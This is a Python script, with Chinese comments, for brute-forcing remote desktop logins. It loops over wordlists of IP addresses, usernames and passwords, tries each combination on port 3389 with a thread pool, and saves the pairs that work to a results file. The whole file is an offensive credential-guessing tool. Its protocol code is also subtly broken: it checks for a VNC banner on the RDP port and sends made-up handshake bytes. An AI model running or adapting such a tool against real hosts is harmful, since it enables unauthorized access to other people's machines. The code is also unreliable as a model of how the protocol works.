import socket
import threading
from concurrent.futures import ThreadPoolExecutor

ip_line = []
username_line = []
password_line = []
success = []

lock = threading.Lock()


def connect(ip, user, password):  # 爆破指定ip的账号密码
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    try:
        sock.connect((ip, 3389))
        data = sock.recv(1024)
        if b"RFB" in data:
            sock.send(b"\x01\x00\x00\x00\x00\x00\x00\x00")
            data = sock.recv(1024)
            if b"\x01\x00\x00\x00" in data:
                sock.send(b"\x02" + bytes([len(user)]) + b"\x00\x00\x00" + bytes(
                    [len(password)]) + b"\x00\x00\x00" + user.encode() + password.encode())
                data = sock.recv(1024)
                if b"\x00\x00\x00\x00" in data:
                    # print(f"[+] Found valid credentials: {user}:{password}")
                    success.append(user + ":" + password + "\n")
    except:
        pass
    sock.close()


def read_ip():
    for ip in open('E:/github/scan/dictionary/ip.txt'):
        ip = ip.replace("\n", "")
        ip_line.append(ip)


def read_username():
    for user in open('E:/github/scan/dictionary/username.txt'):
        user = user.replace("\n", "")
        username_line.append(user)


def read_password():
    for pwd in open('E:/github/scan/dictionary/password.txt'):
        pwd = pwd.replace("\n", "")
        password_line.append(pwd)


def write():
    lock.acquire()
    try:
        with open('E:/github/scan/result/rdp_result.txt', mode='w', encoding='utf-8') as f:
            for url in success:
                f.write(url)
    except Exception as e:
        print(e)
        pass
    f.close()
    lock.release()


def thread_ip_username_password():
    threads = []
    t1 = threading.Thread(target=read_password)
    threads.append(t1)
    t2 = threading.Thread(target=read_ip)  # 创建第一个子线程，子线程任务是调用task1函数，函数名后面没有（）
    threads.append(t2)
    t3 = threading.Thread(target=read_username)
    threads.append(t3)
    t4 = threading.Thread(target=information_r)
    threads.append(t4)
    t5 = threading.Thread(target=write)
    threads.append(t5)
    for t in threads:  # 遍历线程列表
        t.daemon = True  # 将线程声明为守护线程，必须在start方法调用之前设置，如果不设置守护线程程序会无线挂起
        t.start()
        t.join()


def thread_username_password(ips):
    threads = []
    t1 = threading.Thread(target=read_password)
    threads.append(t1)
    t2 = threading.Thread(target=read_username)
    threads.append(t2)
    t3 = threading.Thread(target=information, args=(ips,))
    threads.append(t3)
    t4 = threading.Thread(target=write)
    threads.append(t4)
    for t in threads:  # 遍历线程列表
        t.daemon = True  # 将线程声明为守护线程，必须在start方法调用之前设置，如果不设置守护线程程序会无线挂起
        t.start()
    for t in threads:
        t.join()


def information_r():  # 对爆破使用线程池
    try:
        ip = ip_line
        user = username_line
        pwd = password_line
        with ThreadPoolExecutor(max_workers=10) as executor:
            for ips in ip:
                for username in user:
                    for password in pwd:
                        try:
                            executor.submit(connect, ips.strip(), username.strip(), password.strip())
                        except Exception as e:
                            print(e)
                            pass
    except Exception as e:
        print(e)
        pass


def information(ips):  # 对爆破使用线程池
    try:
        user = username_line
        pwd = password_line
        with ThreadPoolExecutor(max_workers=10) as executor:
            for username in user:
                for password in pwd:
                    try:
                        executor.submit(connect, ips.strip(), username.strip(), password.strip())
                    except Exception as e:
                        print(e)
                        pass
    except Exception as e:
        print(e)
        pass


if __name__ == "__main__":
    thread_username_password("127.0.0.1")
    thread_ip_username_password()
